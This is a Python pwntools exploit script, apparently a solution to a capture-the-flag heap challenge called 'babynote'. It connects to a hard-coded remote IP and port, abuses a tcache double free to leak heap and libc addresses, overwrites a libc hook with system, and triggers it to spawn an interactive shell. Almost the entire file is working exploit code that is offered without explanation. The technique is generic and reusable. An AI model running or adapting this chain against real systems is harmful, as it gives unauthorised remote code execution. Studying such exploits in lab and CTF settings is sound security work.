#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
context.update(arch = 'amd64', os = 'linux', log_level = 'info')

elf  = ELF('./babynote')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')

# Byte sequence alias
A4 = 4 * b'A'
A8 = 8 * b'A'

itob = lambda i : str(i).encode('utf-8')

class Babynote:
    def __init__(self, proc):
        self.proc = proc

    def create(self, size: int, content: bytes):
        self.proc.sendlineafter('Choice >', b'1')
        self.proc.sendlineafter('Note size : ', itob(size))
        self.proc.sendafter('Content : ', content)

    def show(self, index: int):
        self.proc.sendlineafter('Choice >', b'2')
        self.proc.sendlineafter('Note index : ', itob(index))

    def edit(self, index: int, content: bytes):
        self.proc.sendlineafter('Choice >', b'3')
        self.proc.sendlineafter('Note index : ', itob(index))
        self.proc.sendafter('Content : ', content)

    def delete(self, index: int):
        self.proc.sendlineafter('Choice >', b'4')
        self.proc.sendlineafter('Note index : ', itob(index))


def main():
    proc = remote('140.112.31.97', 30203)
    #proc = elf.process()
    #log.debug('You may attatch this process to gdb now.')
    #input()

    notes = Babynote(proc)

    notes.create(0x18, A4)          # tcache: []
    notes.delete(0)                 # tcache: [ chunk0 ]
    notes.create(0x18, A4)          # tcache: []
    notes.delete(0)                 # tcache: [ chunk0 ]

    for i in range(4):
        notes.edit(1, p64(0) + p64(0))  # modify chunk0's key... prepare for double free
        notes.delete(0)                 # tcache: [ chunk0 -> chunk 0 ]

    notes.show(1)
    chunk0_fd = u64(notes.proc.recv(6).ljust(8, b'\x00'))
    heap_base = chunk0_fd - (0x55aa77a972a0 - 0x55aa77a97000)
    log.info('chunk0_fd: {}'.format(hex(chunk0_fd)))
    log.info('heap_base: {}'.format(hex(heap_base)))


    notes.create(0x78, A4)
    notes.create(0x78, b'\x00' * 0x48 + p64(0x21) + b'\x00' * 0x18 + p64(0x21))
    notes.delete(2)
    notes.create(0x78, A4)

    notes.create(0x18, p64(heap_base + 0x2b0))
    notes.create(0x18, p64(0) + p64(0) + p64(heap_base + 0x2a0))
    notes.create(0x18, p64(0) + p64(0xd1))

    for i in range(7):
        notes.delete(2)
        notes.edit(4, p64(0) + p64(0))
    notes.delete(2)

    notes.show(4)
    libc_base = u64(notes.proc.recv(6).ljust(8, b'\x00')) - 0x1ebb80 - 0x60
    libc_system = libc_base + libc.sym['system']
    log.info('libc_base: {}'.format(hex(libc_base)))
    log.info('libc_system: {}'.format(hex(libc_system)))

    notes.edit(1, p64(libc_base + 0x1eeb28 - 8))
    notes.create(0x18, A4)
    notes.create(0x18, b'/bin/sh\x00' + p64(libc_system))
    notes.delete(9)

    proc.interactive()


if __name__ == '__main__':
    main()
